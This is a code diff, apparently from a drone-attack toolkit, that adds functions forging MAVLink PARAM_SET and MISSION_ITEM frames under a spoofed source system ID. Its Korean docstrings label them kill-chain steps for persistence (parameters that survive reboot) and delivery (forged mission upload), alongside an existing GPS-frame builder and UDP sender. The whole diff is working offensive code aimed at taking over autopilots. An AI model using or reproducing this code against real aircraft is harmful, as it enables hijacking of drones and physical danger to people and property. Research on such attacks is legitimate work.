@@ -29,6 +29,33 @@ def build_mavlink_gps_frame(lat_e7=367100000, lon_e7=1261300000, alt_m=80.0):
             {"lat_e7": lat_e7, "lon_e7": lon_e7, "alt_m": alt_m}).encode()
 
 
+def build_mavlink_param_set_frame(param_id: str, value: float):
+    """지속성용 PARAM_SET 프레임(EEPROM 잔존 = 재부팅 후에도 유지). 킬체인 5단계."""
+    try:
+        from pymavlink import mavutil
+        mav = mavutil.mavlink.MAVLink(None)
+        mav.srcSystem = 245
+        msg = mav.param_set_encode(1, 1, param_id.encode()[:16].ljust(16, b"\0"),
+                                   float(value), mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
+        return msg.pack(mav)
+    except Exception:
+        return b"MAVLINK_PARAM_SET:" + json.dumps({"id": param_id, "value": value}).encode()
+
+
+def build_mavlink_mission_item_frame(seq: int, lat_e7: int, lon_e7: int, alt_m: float):
+    """전달용 MISSION_ITEM 프레임(위조 임무 업로드). 킬체인 3단계."""
+    try:
+        from pymavlink import mavutil
+        mav = mavutil.mavlink.MAVLink(None)
+        mav.srcSystem = 245
+        msg = mav.mission_item_int_encode(
+            1, 1, seq, 0, 16, 0, 1, 0, 0, 0, 0, lat_e7, lon_e7, alt_m)
+        return msg.pack(mav)
+    except Exception:
+        return b"MAVLINK_MISSION_ITEM:" + json.dumps(
+            {"seq": seq, "lat_e7": lat_e7, "lon_e7": lon_e7}).encode()
+
+
 def udp_deliver(host, port, payload: bytes) -> int:
     """UDP 데이터그램 송신. 반환: 송신 바이트 수."""
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
